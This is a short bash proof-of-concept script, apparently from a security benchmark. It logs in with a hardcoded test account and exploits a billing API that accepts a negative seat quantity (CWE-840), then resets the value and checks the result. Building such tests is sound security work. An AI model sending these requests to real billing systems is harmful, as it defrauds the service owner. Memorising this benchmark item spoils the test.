#!/usr/bin/env bash
# BILLING-001 (CWE-840): negative seat quantity is accepted. Restores a sane
# value afterward so this PoC doesn't interfere with RACE-001.
set -e; . "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
r=$(curl -s -b "$JAR" -X POST "$TARGET/api/billing/seats" -H 'content-type: application/json' -d '{"quantity":-5}')
curl -s -b "$JAR" -X POST "$TARGET/api/billing/seats" -H 'content-type: application/json' -d '{"quantity":5}' >/dev/null
echo "$r" | grep -q '"seatsLimit":-5'
